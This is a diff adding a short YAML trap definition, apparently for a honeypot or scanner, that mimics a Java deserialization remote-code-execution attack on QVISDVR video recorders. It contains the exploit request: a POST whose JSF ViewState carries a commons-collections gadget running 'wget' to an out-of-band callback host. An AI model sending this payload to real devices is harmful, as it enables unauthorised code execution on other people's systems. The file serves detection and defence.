@@ -1,0 +1,42 @@
+id: qvisdvr-deserialization-rce
+info:
+  name: QVISDVR JSF Deserialization - Remote Code Execution
+  author: me9187
+  description: 'QVISDVR Java-Deserialization was discovered, which could allow remote
+    code execution.
+
+    '
+  severity: critical
+  reference:
+  - https://twitter.com/Me9187/status/1414606876575162373
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: qvisdvr,rce,deserialization,jsf,iot
+traps:
+- request:
+    method: GET
+    path: /qvisdvr/
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: ''
+  response:
+    status_code: 500
+    headers: {}
+    body: ''
+- request:
+    method: POST
+    path: /qvisdvr/index.faces;jsessionid=
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'javax.faces.ViewState={{generate_java_gadget("commons-collections3.1",
+      "wget http://{{interactsh-url}}", "base64")}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
